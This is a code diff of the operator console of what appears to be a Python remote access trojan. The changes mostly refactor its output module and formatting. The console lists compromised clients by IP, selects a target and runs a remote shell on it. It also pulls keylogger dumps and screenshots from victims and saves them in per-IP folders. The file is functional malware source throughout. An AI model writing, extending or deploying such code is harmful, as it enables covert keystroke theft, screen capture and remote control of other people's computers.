@@ -1,43 +1,41 @@
 import os
 import subprocess
 import sys
+import tabulate
 from datetime import datetime
 
-import tabulate
-
-from main.common.output import pull
+from common.output import output
 
 
 class COMMCENTER:
-
     CLIENTS = []
     COUNTER = 0
-    CURRENT = ()    #### Current Target Client ####
+    CURRENT = ()  #### Current Target Client ####
     KEYLOGS = []
 
     def c_help(self, vals):
         if len(vals) > 1:
             if vals[1] == "sessions":
-                pull.help_c_sessions()
+                output.help_c_sessions()
             elif vals[1] == "connect":
-                pull.help_c_connect()
+                output.help_c_connect()
             elif vals[1] == "disconnect":
-                pull.help_c_disconnect()
+                output.help_c_disconnect()
             elif vals[1] == "clear":
-                pull.help_c_clear()
+                output.help_c_clear()
             elif vals[1] == "shell":
-                pull.help_c_shell()
+                output.help_c_shell()
             elif vals[1] == "keylogger":
-                pull.help_c_keylogger()
+                output.help_c_keylogger()
             elif vals[1] == "sysinfo":
-                pull.help_c_sysinfo()
+                output.help_c_sysinfo()
             elif vals[1] == "screenshot":
-                pull.help_c_screenshot()
+                output.help_c_screenshot()
         else:
             if self.CURRENT:
-                pull.help_c_current()
+                output.help_c_current()
             else:
-                pull.help_c_general()
+                output.help_c_general()
 
     def get_valid(self, _id):
         for client in self.CLIENTS:
@@ -56,26 +54,28 @@ class COMMCENTER:
                 self.CURRENT = tgt
             else:
                 sys.stdout.write("\n")
-                pull.error("No client is associated with that ID!")
+                output.error("No client is associated with that ID!")
                 sys.stdout.write("\n")
         else:
             sys.stdout.write("\n")
-            pull.error("Invalid Syntax!")
+            output.error("Invalid Syntax!")
             sys.stdout.write("\n")
 
     def c_disconnect(self):
         self.CURRENT = ()
 
     def c_sessions(self):
-        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
+        headers = (
+            output.BOLD + 'ID' + output.END, output.BOLD + 'IP Address' + output.END, output.BOLD + 'Incoming Port' + output.END,
+            output.BOLD + 'Status' + output.END)
         lister = []
 
         for client in self.CLIENTS:
             toappend = []
-            toappend.append(pull.RED + str(client[0]) + pull.END)
-            toappend.append(pull.DARKCYAN + client[1].ip + pull.END)
-            toappend.append(pull.BLUE + str(client[1].port) + pull.END)
-            toappend.append(pull.GREEN + client[1].STATUS + pull.END)
+            toappend.append(output.RED + str(client[0]) + output.END)
+            toappend.append(output.DARKCYAN + client[1].ip + output.END)
+            toappend.append(output.BLUE + str(client[1].port) + output.END)
+            toappend.append(output.GREEN + client[1].STATUS + output.END)
             lister.append(toappend)
 
         sys.stdout.write("\n")
@@ -95,12 +95,12 @@ class COMMCENTER:
                         self.CURRENT[1].send_data(val)
                         result = self.CURRENT[1].recv_data()
                         if result.strip(" "):
-                          print(result)
+                            print(result)
                     else:
                         break
         else:
             sys.stdout.write("\n")
-            pull.error("You need to connect before execute this command!")
+            output.error("You need to connect before execute this command!")
             sys.stdout.write("\n")
 
     def c_clear(self):
@@ -127,24 +127,24 @@ class COMMCENTER:
                     self.CURRENT[1].send_data("keylogger:dump")
                     result = self.CURRENT[1].recv_data()
                     dirname = os.path.dirname(__file__)
-                    dirname = os.path.join( dirname, 'keylogs' )
+                    dirname = os.path.join(dirname, 'keylogs')
                     if not os.path.isdir(dirname):
                         os.mkdir(dirname)
-                    dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
+                    dirname = os.path.join(dirname, '%s' % (self.CURRENT[1].ip))
                     if not os.path.isdir(dirname):
                         os.mkdir(dirname)
-                    fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt") )
-                    fl = open( fullpath, 'w' )
-                    fl.write( result )
+                    fullpath = os.path.join(dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt"))
+                    fl = open(fullpath, 'w')
+                    fl.write(result)
                     fl.close()
-                    pull.print("Dumped: [" + pull.GREEN + fullpath + pull.END + "]")
+                    output.success("Dumped: [" + output.GREEN + fullpath + output.END + "]")
 
                 else:
-                    pull.error("Invalid Syntax!")
+                    output.error("Invalid Syntax!")
             else:
-                pull.error("Invalid Syntax!")
+                output.error("Invalid Syntax!")
         else:
-            pull.error("You need to connect before execute this command!")
+            output.error("You need to connect before execute this command!")
 
     def c_sysinfo(self):
         if self.CURRENT:
@@ -153,27 +153,27 @@ class COMMCENTER:
             if result.strip(" "):
                 print(result)
         else:
-            pull.error("You need to connect before execute this command!")
+            output.error("You need to connect before execute this command!")
 
     def c_screenshot(self):
         if self.CURRENT:
             self.CURRENT[1].send_data("screenshot:")
             result = self.CURRENT[1].recv_data()
             dirname = os.path.dirname(__file__)
-            dirname = os.path.join( dirname, 'screenshots' )
+            dirname = os.path.join(dirname, 'screenshots')
             if not os.path.isdir(dirname):
                 os.mkdir(dirname)
-            dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
+            dirname = os.path.join(dirname, '%s' % (self.CURRENT[1].ip))
             if not os.path.isdir(dirname):
                 os.mkdir(dirname)
-            fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png") )
-            fl = open( fullpath, 'wb' )
-            fl.write( result )
+            fullpath = os.path.join(dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png"))
+            fl = open(fullpath, 'wb')
+            fl.write(result)
             fl.close()
-            pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
+            output.success("Saved: [" + output.DARKCYAN + fullpath + output.END + "]")
         else:
-            pull.error("You need to connect before execute this command!")
+            output.error("You need to connect before execute this command!")
 
     def c_exit(self):
         sys.stdout.write("\n")
-        pull.exit("See Ya!\n")
+        output.exit("See Ya!\n")
